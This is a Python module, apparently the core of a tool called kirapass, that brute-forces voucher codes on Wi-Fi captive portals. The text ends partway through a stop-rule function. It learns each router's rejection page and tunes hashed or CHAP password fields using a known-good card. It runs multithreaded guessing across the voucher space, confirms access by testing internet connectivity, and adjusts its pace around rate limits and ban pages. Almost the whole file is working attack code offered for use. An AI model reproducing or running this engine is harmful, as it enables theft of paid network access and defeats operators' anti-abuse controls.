"""The engine: calibrate, then try cards and report exactly what happened.

Design rules (all of them come from real failures of the old version):

1. A card is only a hit when there is positive evidence - identical-looking
   pages are never called a hit.
2. Every attempt ends in one counted verdict: ACCEPTED / REJECTED / UNKNOWN /
   BANNED / RATE_LIMITED / NET_ERROR.  The UI shows counts and reasons, so the
   user can see *why* a run went the way it did.
3. Nothing is hidden: unknown replies are saved to disk and listed for review.
4. The engine never dies silently - a traceback becomes a readable error state.
"""

from __future__ import annotations

import hashlib
import json
import os
import queue
import random
import threading
import time
from collections import Counter, deque

from . import config, verify
from .errors import classify
from .fingerprint import Fingerprinter, Judge, Verdict
from .httpclient import Session
from . import store


# ---------------------------------------------------------------------------
# request building - what the browser would really send
# ---------------------------------------------------------------------------
def password_value(p: dict, card: str):
    """Return the password value, or None when the field must be omitted."""
    mode = p.get("pass_mode", "empty")
    if mode == "same":
        return card
    if mode == "empty":
        return ""
    if mode == "omit":
        return None
    if mode == "fixed":
        return p.get("pass_fixed", "")
    if mode == "md5user":
        return hashlib.md5(card.encode()).hexdigest()
    if mode in ("chap", "chap_empty"):
        raw = card if mode == "chap" else ""
        chap = p.get("chap") or {}
        blob = f"{chap.get('id', '')}{raw}{chap.get('challenge', '')}"
        return hashlib.md5(blob.encode()).hexdigest()
    return card


def build_fields(p: dict, card: str) -> dict:
    fields = {}
    pw = password_value(p, card)
    if pw is not None:
        fields[p.get("pass_field") or "password"] = pw
    fields[p.get("user_field") or "username"] = card
    if p.get("send_dst") and p.get("dst_field"):
        fields[p["dst_field"]] = p.get("dst_value", "")
    if p.get("send_popup") and p.get("popup_field"):
        fields[p["popup_field"]] = "true"
    for key, value in (p.get("extra_fields") or {}).items():
        if key in fields:
            continue
        fields[key] = value
    return fields


def send_login(session: Session, p: dict, card: str, timeout=None):
    """One login attempt. Redirects are NOT followed: we must see the
    Location header, because that is the proof the portal let us out."""
    fields = build_fields(p, card)
    url = p["login_url"]
    method = (p.get("method") or "post").lower()
    if method == "post":
        return session.request("POST", url, data=fields,
                               allow_redirects=False, timeout=timeout)
    return session.request("GET", url, params=fields,
                           allow_redirects=False, timeout=timeout)


def submitted_values(p: dict, card: str) -> list:
    values = [card, password_value(p, card) or ""]
    if p.get("send_dst"):
        values.append(p.get("dst_value", ""))
    return [v for v in values if v]


def new_session(timeout=None, for_attack: bool = False) -> Session:
    """A fresh session. `for_attack` uses the tighter login timeout."""
    if timeout is None:
        timeout = (config.CONNECT_TIMEOUT,
                   config.ATTACK_READ_TIMEOUT if for_attack else config.READ_TIMEOUT)
    return Session(connect_timeout=timeout[0], read_timeout=timeout[1])


# ---------------------------------------------------------------------------
# calibration
# ---------------------------------------------------------------------------
class Calibration:
    def __init__(self):
        self.steps = []
        self.ok = False
        self.fingerprint = None
        self.judge = None
        self.profile = {}
        self.internet = {}
        self.portal = None
        self.success_words = []
        self.tuned = None        # which pass_mode/dst made the known card work
        self.error = ""

    def step(self, sid: str, ok: bool, reason: str, detail=None) -> None:
        self.steps.append({"id": sid, "ok": bool(ok), "reason": reason,
                           "detail": detail or {}})

    def as_dict(self) -> dict:
        return {"ok": self.ok, "steps": self.steps,
                "internet": self.internet, "error": self.error,
                "tuned": self.tuned, "success_words": self.success_words,
                "fingerprint": None if not self.fingerprint else {
                    "exact": self.fingerprint.exact,
                    "note": self.fingerprint.note,
                    "dynamic_tokens": self.fingerprint.dynamic_count,
                    "masked_values": len(self.fingerprint.literals),
                    "learned_patterns": len(self.fingerprint.patterns),
                    "reject_status": self.fingerprint.reject_status,
                    "reject_length": self.fingerprint.reject_len,
                    "samples": self.fingerprint.samples,
                },
                "portal": self.portal.as_dict() if self.portal else None}


def bench_cards(p: dict, count: int = 3, seed: int = 0) -> list:
    """Format-valid cards used to learn the rejection page.

    They are drawn from inside the real space, so the router answers with its
    true "wrong card" page - not with a "bad format" page, which was one of
    the reasons the old baseline was wrong.
    """
    space = store.space_size(p)
    if space <= 0:
        return []
    rnd = random.Random(seed or int(time.time()))
    picks = set()
    while len(picks) < min(count, space):
        picks.add(rnd.randrange(space))
    return [store.decode_card(p, i) for i in sorted(picks)]


def calibrate(profile: dict, known_card: str = "", keyword: str = "",
              learn_known: bool = True, log=None, checks=None) -> Calibration:
    p = store.migrate(profile)
    cal = Calibration()
    cal.profile = p
    say = log or (lambda *a, **k: None)

    # A profile that cannot produce a single card (prefix longer than the
    # card, one-symbol charset ...) used to calibrate "successfully" with an
    # empty baseline, and every reply was then judged against nothing.
    problems = [x for x in store.validate(p)
                if x != "space_is_astronomically_big"]
    if problems:
        cal.error = problems[0]
        cal.step("profile_valid", False, problems[0], {"problems": problems})
        return cal
    if store.space_size(p) <= 0:
        cal.error = "card_space_empty"
        cal.step("profile_valid", False, "card_space_empty",
                 {"prefix": p.get("prefix", ""), "length": p.get("length", 0),
                  "charset": p.get("charset", "")[:40]})
        return cal

    session = new_session()

    try:
        # --- 1. can we reach the login page at all? ---------------------
        t0 = time.time()
        try:
            resp = session.get(p["login_url"], allow_redirects=True)
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])
            cal.error = err.kind
            cal.step("reach_login_page", False, f"net_{err.kind}",
                     {"text": err.text[:200]})
            return cal
        ms = (time.time() - t0) * 1000
        p["login_url"] = resp.url or p["login_url"]
        cal.step("reach_login_page", True, "http_ok",
                 {"status": resp.status, "ms": round(ms),
                  "final_url": p["login_url"]})

        # --- 2. is the guest online, walled or offline? -----------------
        cal.internet = verify.probe_internet(session, checks=checks)
        state = cal.internet["state"]
        # If this machine is ALREADY online (another wifi, a cable, a VPN) then
        # "internet works" proves nothing about a card - say so instead of
        # pretending.  The engine then judges hits on redirect/status evidence.
        cal.step("internet_state", state in ("WALLED", "ONLINE"),
                 "internet_online_verification_limited" if state == "ONLINE"
                 else f"internet_{state.lower()}",
                 {k: v for k, v in cal.internet.items() if k != "state"})

        # --- 3. learn what a WRONG card looks like ----------------------
        probes, replies = [], []
        for card in bench_cards(p, 3):
            try:
                r = send_login(session, p, card)
            except Exception as exc:                    # noqa: BLE001
                err = classify(exc, p["login_url"])
                cal.step("rejection_probe", False, f"net_{err.kind}",
                         {"card_hint": card[:4] + "...", "text": err.text[:160]})
                return cal
            probes.append(card)
            replies.append(r)

        if not replies:
            # no probe card could be built, or every probe died: without a
            # baseline anything would look "not rejected", and a run would
            # report unverified nonsense instead of saying what happened.
            cal.error = "no_rejection_baseline"
            cal.step("rejection_baseline", False, "no_probe_reply", {})
            return cal

        if any(s.status in (403, 429, 503) for s in replies) or \
                any(any(w in (r.text or "").lower() for w in config.BAN_WORDS)
                    for r in replies):
            cal.error = "blocked_already"
            cal.step("rejection_baseline", False, "blocked_already",
                     {"advice": "restart_router_or_reconnect",
                      "status": replies[0].status if replies else 0})
            return cal

        fp = Fingerprinter.learn(replies, login_reply=resp)
        cal.fingerprint = fp
        cal.step("rejection_baseline", True, "learned",
                 {"exact": fp.exact, "dynamic_tokens": fp.dynamic_count,
                  "samples": fp.samples,
                  "masked_values": len(fp.literals),
                  "status": fp.reject_status, "length": fp.reject_len,
                  "sample_cards": [c[:6] + "..." for c in probes],
                  "note": fp.note})

        # A probe that already looks accepted is a free known-good card.
        if not known_card:
            probe_judge = Judge(fp, p["login_url"], keyword and [keyword] or [])
            for card, r in zip(probes, replies):
                v = probe_judge.classify(r, submitted_values(p, card))
                if v.is_hit:
                    known_card = card
                    cal.step("probe_looked_accepted", True, v.reason,
                             {"card_hint": card[:4] + "..."})
                    break

        # --- 4. tune the request shape with a known-good card -----------
        if learn_known and known_card:
            p, words, tuned = _tune_with_known_card(p, known_card, fp, session,
                                                    checks=checks)
            if words:
                cal.success_words = words
                p["success_words"] = words
            if tuned:
                cal.tuned = tuned
                cal.step("shape_tuned", True, "known_card_works",
                         {"tuned": tuned, "words": words[:6]})
            else:
                cal.step("shape_tuned", False, "known_card_not_proven",
                         {"hint": "browser_trace"})
            verify.logout(session, p["login_url"])

        if keyword:
            words = list(dict.fromkeys(list(cal.success_words) + [keyword]))
            cal.success_words = words
            p["success_words"] = words

        cal.judge = Judge(fp, p["login_url"], success_words=cal.success_words,
                          success_url_contains=p.get("success_url_contains", ""))
        cal.ok = True
        return cal
    finally:
        session.close()


def _tune_with_known_card(p: dict, known_card: str, fp: Fingerprinter, session,
                          checks=None):
    """Try the sensible (password value x dst) combinations for the good card.

    Returns (profile, success_words, tuned).  A combination is accepted only
    with positive evidence: a redirect out of the portal, real internet, or a
    reply whose shape clearly differs from the rejection page.
    """
    dsts = list(dict.fromkeys([p.get("dst_value", ""),
                               "http://www.msftconnecttest.com/redirect",
                               "http://connectivitycheck.gstatic.com/generate_204",
                               ""]))
    modes = ["empty", "same", "omit", "chap", "chap_empty", "md5user"]
    if p.get("chap") is None:
        modes = [m for m in modes if not m.startswith("chap")]
    best = None

    for dst in dsts:
        for mode in modes:
            trial = dict(p)
            trial["pass_mode"] = mode
            trial["dst_value"] = dst
            judge = Judge(fp, p["login_url"])
            try:
                r = send_login(session, trial, known_card)
            except Exception:                            # noqa: BLE001
                continue
            verdict = judge.classify(r, submitted_values(trial, known_card))
            evidence = 0.0
            if r.is_redirect():
                host = (r.location.split("//")[-1].split("/")[0] or "").lower()
                if host and host != (p["login_url"].split("//")[-1]
                                     .split("/")[0].lower()):
                    evidence = 0.9
            if verdict.is_hit:
                evidence = max(evidence, verdict.confidence)
            if not evidence:
                continue
            ok, info = verify.verify_online(session, checks=checks)
            if ok:
                evidence = 1.0
            words = _new_words(r.text or "", fp.reject_text)
            candidate = {"mode": mode, "dst": dst, "evidence": evidence,
                         "verified": ok, "internet": info.get("detail", ""),
                         "location": r.location[:160], "words": words}
            if best is None or candidate["evidence"] > best["evidence"]:
                best = candidate
            if evidence:
                # a successful login puts this session "online": the next
                # combination would then be judged against a logged-in router
                # and look accepted for the wrong reason
                verify.logout(session, p["login_url"])
            if evidence >= 0.9:
                break
        if best and best["evidence"] >= 0.9:
            break

    if not best:
        return p, [], None

    p["pass_mode"] = best["mode"]
    p["dst_value"] = best["dst"]
    tuned = {k: v for k, v in best.items() if k != "words"}
    return p, best["words"], tuned


def _new_words(page: str, reference: str, limit: int = 10) -> list:
    from .fingerprint import diff_words
    return diff_words(page, reference, limit=limit)["new_words"]


# ---------------------------------------------------------------------------
# diagnostics - the "why is it behaving like this" report
# ---------------------------------------------------------------------------
def diagnose(profile: dict, threads: int = 0, log=None, checks=None) -> dict:
    p = store.migrate(profile)
    out = {"ok": True, "steps": [], "latency": {}, "advice": []}
    session = new_session()

    def step(sid, ok, reason, detail=None):
        out["steps"].append({"id": sid, "ok": bool(ok), "reason": reason,
                             "detail": detail or {}})

    try:
        t0 = time.time()
        try:
            r = session.get(p["login_url"], allow_redirects=True)
            step("reach", True, "http_ok", {"status": r.status,
                                            "ms": round((time.time()-t0)*1000)})
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])
            step("reach", False, f"net_{err.kind}", {"text": err.text[:200]})
            out["ok"] = False
            return out

        out["internet"] = verify.probe_internet(session, checks=checks)
        step("internet", out["internet"]["state"] == "WALLED",
             f"internet_{out['internet']['state'].lower()}",
             {k: v for k, v in out["internet"].items() if k != "state"})

        # latency + error sample: one at a time, then the requested load
        seq = _sample(session, p, 20, 1)
        out["latency"]["sequential"] = seq
        step("sample_single", seq["errors"] == 0 or seq["error_rate"] < 5,
             "ok" if seq["errors"] == 0 else "errors_present", seq)

        use_threads = threads or config.DEFAULT_THREADS
        par = _sample(session, p, max(30, use_threads * 3), use_threads)
        out["latency"]["parallel"] = par
        step("sample_parallel", par["error_rate"] < 20,
             "ok" if par["error_rate"] < 10 else "errors_rising", par)

        ban_seen = par.get("banned", 0) + seq.get("banned", 0)
        step("ban_check", ban_seen == 0,
             "no_ban_seen" if not ban_seen else "ban_page_seen",
             {"ban_pages": ban_seen})
        if ban_seen:
            out["advice"].append({"reason": "blocked_already",
                                  "fix": "restart_router_or_reconnect"})
        if par["error_rate"] > 20 and seq["error_rate"] <= 5:
            rec = max(2, use_threads // 3)
            out["advice"].append({"reason": "router_pressure",
                                  "suggest_threads": rec})
        if seq["avg_ms"] > config.SLOW_DIAG_AFTER * 1000:
            out["advice"].append({"reason": "slow_router"})
        if out["internet"]["state"] == "ONLINE":
            out["advice"].append({"reason": "already_online_no_captive_portal"})
        out["ok"] = True
        return out
    finally:
        session.close()


def _sample(session: Session, p: dict, count: int, threads: int) -> dict:
    """Send wrong-but-valid cards and measure - never counts them as done."""
    cards = [c for c in bench_cards(p, count)]
    stats = {"sent": 0, "errors": 0, "codes": Counter(), "kinds": Counter(),
             "banned": 0, "lat": []}
    lock = threading.Lock()

    def one(card):
        sess = session if threads == 1 else new_session()
        t0 = time.time()
        try:
            r = send_login(sess, p, card)
        except Exception as exc:                        # noqa: BLE001
            err = classify(exc, p["login_url"])
            with lock:
                stats["sent"] += 1
                stats["errors"] += 1
                stats["kinds"][err.kind] += 1
            return
        finally:
            if sess is not session:
                sess.close()
        with lock:
            stats["sent"] += 1
            stats["lat"].append(round((time.time() - t0) * 1000))
            stats["codes"][r.status] += 1
            low = (r.text or "").lower()
            if any(w in low for w in config.BAN_WORDS):
                stats["banned"] += 1

    if threads <= 1:
        for c in cards:
            one(c)
    else:
        q = queue.Queue()
        for c in cards:
            q.put(c)

        def worker():
            while True:
                try:
                    c = q.get_nowait()
                except queue.Empty:
                    return
                try:
                    one(c)
                finally:
                    q.task_done()

        ws = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        for w in ws:
            w.start()
        for w in ws:
            w.join()

    lat = sorted(stats["lat"])
    stats["error_rate"] = round(stats["errors"] / max(stats["sent"], 1) * 100, 1)
    stats["avg_ms"] = round(sum(lat) / len(lat)) if lat else 0
    stats["p95_ms"] = lat[int(len(lat) * 0.95)] if lat else 0
    stats["codes"] = {str(k): v for k, v in stats["codes"].items()}
    stats["kinds"] = dict(stats["kinds"])
    return stats


# ---------------------------------------------------------------------------
# the attack engine
# ---------------------------------------------------------------------------
class Engine:
    """Threaded guessing with live events. One instance per web session."""

    def __init__(self, store_obj: store.Store, persist: bool = True, checks=None):
        self.store = store_obj
        self.persist = persist        # False: throw-away runs (self-test)
        self.checks = checks          # override the "are we online?" URLs
        self.lock = threading.Lock()
        self.state = "idle"
        self.events = deque(maxlen=4000)
        self.seq = 0
        self.thread = None
        self.stop_event = threading.Event()
        self.started_at = 0.0
        self.finished_at = 0.0
        self.profile = {}
        self.plan = {}
        self.counters = Counter()
        self.net_kinds = Counter()
        self.reason_counts = Counter()
        self.hits = []
        self.review = []
        self.stop_reason = ""
        self.error = ""
        self.progress = {"attempts": 0, "total": 0, "covered": 0,
                         "space": 0, "percent": 0.0}
        self.speed = 0.0
        self.latencies = deque(maxlen=500)
        self.throttle = {"delay_ms": 0, "base_ms": 0, "reason": "", "events": []}
        self.calibration = None
        self.diagnostics = None
        self.verify_enabled = True
        self.auto_stop = True
        self._internet_before = {}
        self._last_event_at = 0.0
        self._clean_streak = 0
        self._ban_count = 0
        self._rate_count = 0
        self._unknown_saved = 0
        self._rejected_since_emit = 0

    # -- events ----------------------------------------------------------
    def emit(self, kind: str, payload=None) -> None:
        with self.lock:
            self.seq += 1
            self.events.append({"seq": self.seq, "t": round(time.time(), 3),
                                "kind": kind, "data": payload or {}})

    def events_since(self, since: int = 0) -> list:
        with self.lock:
            return [e for e in self.events if e["seq"] > since]

    # -- public API ------------------------------------------------------
    def status(self, since: int = 0) -> dict:
        with self.lock:
            now = time.time()
            elapsed = (self.finished_at or now) - self.started_at \
                if self.started_at else 0
            processed = sum(self.counters.values())
            self.progress["attempts"] = processed   # cards really tried
            progress = dict(self.progress)
            progress.setdefault("queued", processed)
            self.speed = processed / elapsed if elapsed > 0.05 else 0.0
            lat = sorted(self.latencies)
            return {
                "state": self.state,
                "error": self.error,
                "profile": self.profile.get("name", ""),
                "plan": self.plan,
                "counters": dict(self.counters),
                "reason_counts": dict(self.reason_counts),
                "net_kinds": dict(self.net_kinds),
                "hits": self.hits,
                "review": self.review[-40:],
                "review_count": len(self.review),
                "stop_reason": self.stop_reason,
                "progress": progress,
                "speed": round(self.speed, 2),
                "elapsed": round(elapsed, 1),
                "latency": {"avg_ms": round(sum(lat) / len(lat)) if lat else 0,
                            "p95_ms": lat[int(len(lat) * 0.95)] if lat else 0},
                "throttle": {"delay_ms": self.throttle["delay_ms"],
                             "base_ms": self.throttle["base_ms"],
                             "reason": self.throttle["reason"]},
                "calibration": self.calibration,
                "diagnostics": self.diagnostics,
                "verify_enabled": self.verify_enabled,
                "seq": self.seq,
            }

    def stop(self, reason: str = "user_stop") -> None:
        if not self.stop_reason:
            self.stop_reason = reason
        self.stop_event.set()

    def start(self, profile: dict, attempts: int, threads: int, delay_ms: int = 0,
              keyword: str = "", known_card: str = "", verify_after: bool = True,
              auto_stop: bool = True, resume: bool = True) -> dict:
        if self.state == "running":
            return {"ok": False, "error": "already_running"}
        p = store.migrate(profile)
        if not resume:
            # start the space from the beginning again - with a fresh walk, so
            # it really is a new pass and not the same cards in the same order
            p.update({"space_pos": 0, "walk_a": 0, "walk_b": 0})
        problems = store.validate(p)
        hard = [x for x in problems if x != "space_is_astronomically_big"]
        if hard:
            return {"ok": False, "error": "profile_invalid", "problems": problems}

        self.profile = p
        self.plan = {"attempts": int(attempts), "threads": int(threads),
                     "delay_ms": int(delay_ms), "keyword": keyword,
                     "known_card": bool(known_card), "verify": bool(verify_after),
                     "resume": bool(resume)}
        self.verify_enabled = bool(verify_after)
        self.auto_stop = bool(auto_stop)
        self.counters = Counter()
        self.net_kinds = Counter()
        self.reason_counts = Counter()
        self.hits, self.review = [], []
        self.stop_reason, self.error = "", ""
        # a new run starts with a clean event stream, so the page never shows
        # results from the previous run
        with self.lock:
            self.events.clear()
            self.seq = 0
        self.latencies.clear()
        self.throttle.update({"delay_ms": int(delay_ms), "base_ms": int(delay_ms),
                              "reason": "", "events": []})
        self._ban_count = self._rate_count = self._unknown_saved = 0
        self._clean_streak = 0
        space = store.space_size(p)
        pos = max(0, int(p.get("space_pos", 0)))
        total = int(attempts)
        if space:
            total = min(total, max(space - (pos % space), 0)) or int(attempts)
        self.progress = {"attempts": 0, "queued": 0, "dropped": 0,
                         "total": total, "covered": min(pos, space),
                         "space": space, "percent": 0.0}
        self.started_at, self.finished_at = time.time(), 0.0
        self.stop_event.clear()
        self.state = "calibrating"
        self.emit("state", {"state": "calibrating"})
        self.thread = threading.Thread(
            target=self._run, args=(p, int(attempts), int(threads), delay_ms,
                                    keyword, known_card),
            daemon=True, name="kirapass-engine")
        self.thread.start()
        return {"ok": True}

    # -- the run ---------------------------------------------------------
    def _run(self, p, attempts, threads, delay_ms, keyword, known_card) -> None:
        try:
            cal = calibrate(p, known_card=known_card, keyword=keyword,
                            checks=self.checks)
            self.calibration = cal.as_dict()
            self.emit("calibration", self.calibration)
            if not cal.ok:
                self.state, self.error = "done", cal.error or "calibration_failed"
                self.stop_reason = "calibration_failed"
                self.finished_at = time.time()
                self.emit("state", {"state": "done",
                                    "stop_reason": self.stop_reason})
                return
            self.profile = cal.profile
            self._internet_before = cal.internet or {}
            judge = cal.judge
            self.state = "running"
            self.emit("state", {"state": "running"})

            space = store.space_size(self.profile)
            start_pos = int(self.profile.get("space_pos", 0))
            if self.profile.get("walk_a") in (0, None):
                self.profile["walk_a"] = _coprime(space)
                self.profile["walk_b"] = random.randrange(max(space, 1)) if space else 0
            if start_pos:
                # the user asked to continue: say it out loud instead of
                # silently starting somewhere in the middle of the space
                self.emit("resume", {"from": min(start_pos, space) if space
                                             else start_pos,
                                     "space": space,
                                     "pass": int(self.profile.get("space_pass", 0))})

            task_q = queue.Queue(maxsize=max(16, threads * 4))
            stop_holder = {"done": False}

            def worker():
                sess = new_session(for_attack=True)
                try:
                    while not self.stop_event.is_set():
                        try:
                            item = task_q.get(timeout=0.2)
                        except queue.Empty:
                            if stop_holder["done"]:
                                return
                            continue
                        try:
                            if item is None:
                                return
                            self._attempt(sess, judge, item[0], item[1])
                        except Exception as exc:      # noqa: BLE001
                            import traceback
                            with self.lock:
                                self.counters["INTERNAL_ERROR"] += 1
                            self.emit("internal", {
                                "message": f"{type(exc).__name__}: {exc}",
                                "trace": traceback.format_exc()[-600:],
                                "card": item[0] if item else ""})
                        finally:
                            task_q.task_done()
                finally:
                    sess.close()

            workers = [threading.Thread(target=worker, daemon=True,
                                        name=f"kirapass-w{i}")
                       for i in range(threads)]
            for w in workers:
                w.start()

            sent = 0
            pos = start_pos
            try:
                while sent < attempts and not self.stop_event.is_set():
                    card = store.card_at_walk_pos(self.profile, pos)
                    # bounded put: a stopped run must never hang here
                    while not self.stop_event.is_set():
                        try:
                            task_q.put((card, sent + 1), timeout=0.2)
                            break
                        except queue.Full:
                            continue
                    else:
                        break
                    pos += 1
                    sent += 1
                    with self.lock:
                        self.progress["queued"] = sent
                        self.progress["percent"] = round(
                            sent / max(self.progress["total"], 1) * 100, 1)
                    if space and pos - start_pos >= space:
                        break
            except KeyboardInterrupt:
                self.stop("user_stop")
            finally:
                # let the workers finish what is already queued, so a card is
                # never counted as "tested" without being tested
                if not self.stop_event.is_set():
                    deadline = time.time() + 30
                    while time.time() < deadline:
                        if not getattr(task_q, "unfinished_tasks", 0):
                            break
                        time.sleep(0.02)
                dropped = 0
                while True:
                    try:
                        task_q.get_nowait()
                    except queue.Empty:
                        break
                    else:
                        dropped += 1
                        task_q.task_done()
                stop_holder["done"] = True
                self.stop_event.set()
                if dropped:
                    with self.lock:
                        self.progress["dropped"] = \
                            self.progress.get("dropped", 0) + dropped
                for w in workers:
                    w.join(timeout=5.0)

            # Remember how far we got, so the next run continues instead of
            # restarting.  Only cards that really got an answer are counted:
            # whatever was still in the queue when the run stopped is retried
            # next time (counting it as "done" would skip it forever).
            with self.lock:
                processed = sum(self.counters.values())
            resume_pos = start_pos + processed
            if space:
                passes, offset = divmod(resume_pos, space)
                self.profile["space_pos"] = offset
                if passes:
                    self.profile["space_pass"] = int(
                        self.profile.get("space_pass", 0)) + passes
                    # a new pass over the same space: walk it in a new order
                    self.profile["walk_a"] = _coprime(space)
                    self.profile["walk_b"] = random.randrange(space)
            else:
                self.profile["space_pos"] = resume_pos
            if self.persist:
                self.store.put(self.profile)

            with self.lock:
                self.progress["covered"] = min(resume_pos, space) if space \
                    else resume_pos
            if not self.stop_reason:
                self.stop_reason = "attempts_done"
            self.state = "done"
            self.finished_at = time.time()
            self._save_report()
            self.emit("state", {"state": "done",
                                "stop_reason": self.stop_reason})
        except Exception as exc:                          # noqa: BLE001
            import traceback
            self.error = f"{type(exc).__name__}: {exc}"
            self.state = "done"
            self.finished_at = time.time()
            self.stop_reason = "engine_error"
            self.emit("error", {"message": self.error,
                                "trace": traceback.format_exc()[-800:]})
            self.emit("state", {"state": "done", "stop_reason": self.stop_reason})

    # -- one attempt -----------------------------------------------------
    def _attempt(self, sess, judge, card: str, sent_index: int) -> None:
        sess.read_timeout = config.ATTACK_READ_TIMEOUT
        delay = self.throttle["delay_ms"] / 1000.0
        if delay > 0:
            time.sleep(delay)
        started = time.time()
        resp = None
        last_err = None
        for attempt in range(3):        # retry only real transport hiccups
            try:
                resp = send_login(sess, self.profile, card)
                break
            except Exception as exc:                      # noqa: BLE001
                err = classify(exc, self.profile.get("login_url", ""))
                last_err = err
                if err.retryable and attempt < 2:
                    time.sleep(0.06 * (attempt + 1))
                    continue
                break

        if resp is None:
            kind = last_err.kind if last_err else "unknown"
            with self.lock:
                self.net_kinds[kind] += 1
            self._emit_net_error(kind, card, last_err)
            self._apply_delay_pressure(kind)
            self._check_stop_rules()
            return

        elapsed_ms = (time.time() - started) * 1000
        verdict = judge.classify(resp, submitted_values(self.profile, card))

        if verdict.is_hit and self.verify_enabled:
            verdict = self._verify_hit(sess, verdict, card)

        with self.lock:
            self.latencies.append(round(elapsed_ms))
            self.counters[verdict.code] += 1
            self.reason_counts[verdict.reason] += 1
            if verdict.is_hit:
                self._clean_streak = 0
            else:
                self._clean_streak += 1

        if verdict.is_hit:
            self._register_hit(card, verdict)
        elif verdict.code == "UNKNOWN":
            self._save_unknown(card, verdict, resp)
        elif verdict.code == "BANNED":
            # every worker thread touches these counters, so they are only
            # ever changed while holding the lock (a lost update here would
            # mean a ban page that never stops the run)
            with self.lock:
                self._ban_count += 1
            self._apply_delay_pressure("banned")
        elif verdict.code == "RATE_LIMITED":
            with self.lock:
                self._rate_count += 1
            self._apply_delay_pressure("rate_limited", resp)
        elif verdict.code == "CHALLENGE":
            self.stop("captcha_challenge")

        self._emit_attempt(card, resp, verdict, sent_index)
        self._maybe_decay_delay()
        self._check_stop_rules()

    def _verify_hit(self, sess, verdict: Verdict, card: str) -> Verdict:
        """A hit is only final when the card really opened the internet.

        If the machine was already online before we sent any card, an internet
        check cannot prove anything - then the verdict stays ACCEPTED and the
        reason says exactly that, instead of faking certainty.
        """
        already_online = (self._internet_before or {}).get("state") == "ONLINE"
        if already_online:
            status = verify.portal_status_page(sess, self.profile["login_url"])
            return Verdict("ACCEPTED", "accepted_internet_already_open",
                           min(verdict.confidence, 0.85),
                           data={**verdict.data,
                                 "internet": "SKIPPED_ALREADY_ONLINE",
                                 "status_page": status.get("looks_logged_in", False)},
                           evidence={**verdict.evidence, "status_page": status})
        ok, info = verify.verify_online(sess, checks=self.checks)
        status = verify.portal_status_page(sess, self.profile["login_url"])
        v = Verdict("ACCEPTED_VERIFIED" if ok else verdict.code,
                    "redirect_out_of_portal_and_online" if ok else verdict.reason,
                    1.0 if ok else verdict.confidence,
                    data={**verdict.data, "internet": info.get("state", ""),
                          "internet_detail": info.get("detail", ""),
                          "status_page": status.get("looks_logged_in", False)},
                    evidence={**verdict.evidence, "internet": info,
                              "status_page": status})
        if not ok and verdict.code == "ACCEPTED":
            v.code = "ACCEPTED_UNVERIFIED"
        return v

    def _register_hit(self, card: str, verdict: Verdict) -> None:
        hit = {"card": card, "code": verdict.code, "reason": verdict.reason,
               "confidence": verdict.confidence, "time": time.strftime("%H:%M:%S"),
               "data": verdict.data}
        with self.lock:
            self.hits.append(hit)
        self.store.append_hit(f"{time.strftime('%Y-%m-%d %H:%M:%S')} card={card} "
                              f"code={verdict.code} reason={verdict.reason} "
                              f"{json.dumps(verdict.data, ensure_ascii=False)[:200]}")
        self.emit("hit", hit)
        strong = (verdict.code == "ACCEPTED_VERIFIED"
                  or verdict.confidence >= 0.85)
        if self.auto_stop and strong:
            self.stop("found_verified" if verdict.code == "ACCEPTED_VERIFIED"
                      else "found_strong_evidence")

    def _save_unknown(self, card: str, verdict: Verdict, resp) -> None:
        with self.lock:
            if self._unknown_saved >= 50:
                return
            self._unknown_saved += 1
        saved = self.store.save_review(self.seq, card, verdict.as_dict(),
                                       resp.text or "")
        if saved:
            with self.lock:
                self.review.append(saved)
            self.emit("review", saved)

    def _emit_attempt(self, card, resp, verdict: Verdict, idx: int) -> None:
        interesting = verdict.code != "REJECTED"
        with self.lock:
            self._rejected_since_emit += 1
            quiet = self._rejected_since_emit
        if not interesting and quiet < 25:
            self._emit_stats()
            return
        with self.lock:
            self._rejected_since_emit = 0
        self.emit("attempt", {
            "card": card, "code": verdict.code, "reason": verdict.reason,
            "data": verdict.data, "status": resp.status,
            "ms": round(resp.elapsed_ms), "length": resp.length,
            "location": resp.location[:120], "index": idx,
        })
        self._emit_stats()

    def _emit_net_error(self, kind: str, card: str, err) -> None:
        with self.lock:
            self.counters["NET_ERROR"] += 1
            self.reason_counts[kind] += 1
        self.emit("attempt", {"card": card, "code": "NET_ERROR", "reason": kind,
                              "data": {"text": (err.text if err else "")[:160]},
                              "status": 0, "ms": 0, "length": 0})
        self._emit_stats()

    def _emit_stats(self) -> None:
        now = time.time()
        if now - self._last_event_at < 0.4:
            return
        self._last_event_at = now
        self.emit("stats", self.status_snapshot())

    def status_snapshot(self) -> dict:
        with self.lock:
            return {"counters": dict(self.counters),
                    "reason_counts": dict(self.reason_counts),
                    "net_kinds": dict(self.net_kinds),
                    "progress": dict(self.progress),
                    "speed": round(self.speed, 1),
                    "delay_ms": self.throttle["delay_ms"],
                    "throttle_reason": self.throttle["reason"]}

    # -- flow control ----------------------------------------------------
    def _apply_delay_pressure(self, reason: str, resp=None) -> None:
        """Slow down on purpose and say why. Never slow down silently."""
        with self.lock:
            base = self.throttle["base_ms"]
            current = self.throttle["delay_ms"]
            cap = 2000
            if reason == "rate_limited":
                wait = _retry_after(resp) if resp is not None else 0
                new = max(current + 250, min(cap, base + 400), min(wait * 1000, cap))
                note = "rate_limited_slowing_down"
            elif reason == "banned":
                new = min(cap, max(current + 400, 800))
                note = "ban_page_slowing_down"
            elif reason in ("refused", "reset"):
                new = min(cap, current + 75)
                note = "connections_refused_slowing_down"
            elif current < 1000:      # transient hiccups: nudge, never flood
                new = current + 25
                note = "network_errors_slowing_down"
            else:
                new = current
                note = "network_errors_slowing_down"
            self.throttle["delay_ms"] = int(new)
            self.throttle["reason"] = note
            self.throttle["events"].append({"t": round(time.time(), 1),
                                            "reason": note,
                                            "delay_ms": int(new)})
        self.emit("throttle", {"reason": note, "delay_ms": int(new)})

    def _maybe_decay_delay(self) -> None:
        base = self.throttle["base_ms"]
        with self.lock:
            current = self.throttle["delay_ms"]
            if current <= base or self._clean_streak < 150:
                return
            new = max(base, int(current * 0.6))
            self._clean_streak = 0
            self.throttle["delay_ms"] = new
            self.throttle["reason"] = "recovering_speed" if new > base else ""
        self.emit("throttle", {"reason": "recovering_speed", "delay_ms": new})

    def _check_stop_rules(self) -> None:
        """Stop only for reasons we can explain."""
        counters = self.counters
        errors = counters.get("NET_ERROR", 0)
        attempts = sum(counters.values())
        if errors >= config.BURST_LIMIT and errors >= attempts * 0.8:
